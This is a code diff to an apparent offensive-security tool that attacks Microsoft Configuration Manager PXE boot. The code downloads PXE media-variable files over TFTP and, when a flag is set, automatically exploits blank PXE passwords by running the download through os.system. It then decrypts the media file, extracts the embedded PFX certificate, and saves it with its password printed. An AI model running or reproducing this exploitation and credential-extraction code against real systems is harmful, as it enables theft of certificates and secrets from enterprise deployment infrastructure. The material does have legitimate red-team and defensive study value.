@@ -21,10 +21,11 @@ import lxml.etree as ET
 import requests
 from requests_toolbelt import MultipartEncoder,MultipartDecoder
 import zlib
-import win32crypt
 import datetime
 from os import walk,system
 from ipaddress import IPv4Network,IPv4Address
+if platform.system().lower().startswith('win'):
+    import win32crypt
 
 #Scapy global variables
 osName = platform.system()
@@ -293,32 +294,14 @@ def get_pxe_files(ip):
         var_file_name = variables_file.split("\\")[-1]
         tftp_download_string = ("tftp -i " + tftp_server_ip + " GET " + "\"" + variables_file + "\"" + " " + "\"" + variables_file.split("\\")[-1] + "\"\n" +
         "tftp -i " + tftp_server_ip + " GET " + "\"" + bcd_file + "\"" + " " + "\"" + bcd_file.split("\\")[-1] + "\"")
-        if BLANK_PASSWORDS_FOUND:
-            config = configparser.ConfigParser(allow_no_value=True)
-            config.read('settings.ini')
-            general_config = config["GENERAL SETTINGS"]
-            auto_exploit_blank_password = general_config.getint("auto_exploit_blank_password")
-            if auto_exploit_blank_password:
-                print("[!] Attempting automatic exploitation. Note that this will require the tftp client on Windows to be installed (can be found under Windows Features), and this will be run with os.system")
-                os.system(var_file_download_cmd)
-                use_encrypted_key(encrypted_key,var_file_name)
-                return
-            else:
-                print("[!] Change auto_exploit_blank_password in settings.ini to 1 to attempt exploitation of blank password")
     else:
-        
-        '''print("")
-        print("tftp " + tftp_server_ip + " << _EOF_")
-        print("mode octet")
-        print("get " + variables_file + " " + variables_file.split("\\")[-1])
-        print("get " + bcd_file + " " + bcd_file.split("\\")[-1])
-        print("quit")
-        print("_EOF_")
-
-        print("")
+        var_file_download_cmd = "tftp -m binary " + tftp_server_ip + " -c get " + "\"" + variables_file + "\"" + " " + "\"" + variables_file.split("\\")[-1] + "\"\n" 
+        tftp_download_string = var_file_download_cmd + "tftp -m binary " + tftp_server_ip + " -c get " + "\"" + bcd_file + "\"" + " " + "\"" + bcd_file.split("\\")[-1] + "\""
+        var_file_name = variables_file.split("\\")[-1]
+        '''
         print("Or, if you have atftp installed: ")
         print("")
-        '''
+ 
         tftp_download_string = ("atftp --option \"blksize 1428\" --verbose " + 
         tftp_server_ip + 
         " << _EOF_\n" + 
@@ -327,9 +310,23 @@ def get_pxe_files(ip):
         "get " + bcd_file + " " + bcd_file.split("\\")[-1] + "\n" +
         "quit\n" +
         "_EOF_\n" )
+        '''
 
     print("[+] Use this command to grab the files: ")
     print(tftp_download_string)
+    if BLANK_PASSWORDS_FOUND:
+            config = configparser.ConfigParser(allow_no_value=True)
+            config.read('settings.ini')
+            general_config = config["GENERAL SETTINGS"]
+            auto_exploit_blank_password = general_config.getint("auto_exploit_blank_password")
+            if auto_exploit_blank_password:
+                print("[!] Attempting automatic exploitation. Note that this will require the default tftp client to be installed (on Windows, this can be found under Windows Features), and this will be run with os.system")
+                os.system(var_file_download_cmd)
+                use_encrypted_key(encrypted_key,var_file_name)
+            else:
+                print("[!] Change auto_exploit_blank_password in settings.ini to 1 to attempt exploitation of blank password")
+    else:
+        print("[+] User configured password detected for PXE in MECM")
 
 def generateSignedData(data,cryptoProv):
 
@@ -456,7 +453,24 @@ def use_encrypted_key(encrypted_key, media_file_path):
             new_key = new_key + byte + b'\x00'
 
     media_variables = decrypt_media_file(media_file_path,new_key)
-    process_pxe_bootable_and_prestaged_media(media_variables)
+    
+    print("[!] Writing media variables to variables.xml")
+    write_to_file("variables",media_variables)
+    
+    #Parse media file in order to pull out PFX password and PFX bytes
+    root = ET.fromstring(media_variables.encode("utf-16-le"))
+    smsMediaSiteCode = root.find('.//var[@name="_SMSTSSiteCode"]').text 
+    smsMediaGuid = (root.find('.//var[@name="_SMSMediaGuid"]').text)[:31]
+    smsTSMediaPFX = binascii.unhexlify(root.find('.//var[@name="_SMSTSMediaPFX"]').text)
+    filename = smsMediaSiteCode + "_" + smsMediaGuid +"_SMSTSMediaPFX.pfx"
+    
+    print("[!] Writing _SMSTSMediaPFX to "+ filename + ". Certificate password is " + smsMediaGuid)
+    write_to_binary_file(filename,smsTSMediaPFX)
+    
+    if osName == "Windows":
+        process_pxe_bootable_and_prestaged_media(media_variables)
+    else:
+        print("[!] Automatically retrieving passwords not possible without win32crypt")
 
 #Parse the downloaded task sequences and extract sensitive data if present
 def dowload_and_decrypt_policies_using_certificate(guid,cert_bytes):
@@ -636,6 +650,11 @@ def process_task_sequence_xml(ts_xml):
 
 def write_to_file(filename, contents):
     f = open(filename + ".xml", "w")
+    f.write(contents)
+    f.close()
+    
+def write_to_binary_file(filename, contents):
+    f = open(filename, "wb")
     f.write(contents)
     f.close()
 
